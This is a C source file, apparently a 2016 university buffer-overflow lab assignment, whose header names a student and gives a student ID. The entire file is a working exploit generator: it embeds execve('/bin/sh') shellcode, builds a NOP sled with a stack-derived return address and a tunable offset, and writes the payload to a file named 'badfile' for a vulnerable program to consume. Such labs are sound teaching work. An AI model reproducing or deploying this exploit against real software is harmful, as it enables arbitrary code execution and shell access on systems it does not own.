/**
*   Name:       Kyle Colantonio
*   CSUID:      2595744
*   Date:       10-MAR-2016
*   Project 1:  Buffer Overflow exploration
                (exploit program)
*
*   UPDATED:    06-MAR-2016
**/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Our generic offset */
#define OFFSET 256

/* Our malicious shell code */
const char shellcode[] =
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

/**
    Gets a stack pointer for us to use.
**/
unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

int main(int argc, char **argv) {
    char buffer[517];
    FILE *badfile;
    int offset = OFFSET;

    /* If we have an argument, assume it's an offset
        we wish to use instead of our internal one. */
    if (argc == 2) {
        offset = atoi(argv[1]);
    }

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, sizeof(buffer));

    /* Calculate and display our return address to use */
    long ret = get_sp() + offset;
    fprintf(stdout, "Return Address: 0x%lx\n", get_sp());
    fprintf(stdout, "Address: 0x%lx\n", ret);

    /* Copy information into buffer */
    memcpy(buffer +  0x24, &ret, sizeof(ret));
    memcpy(buffer + offset, shellcode, sizeof(shellcode));

    /* Save the contents to the file */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, sizeof(buffer), 1, badfile);
    fclose(badfile);

    return EXIT_SUCCESS;
}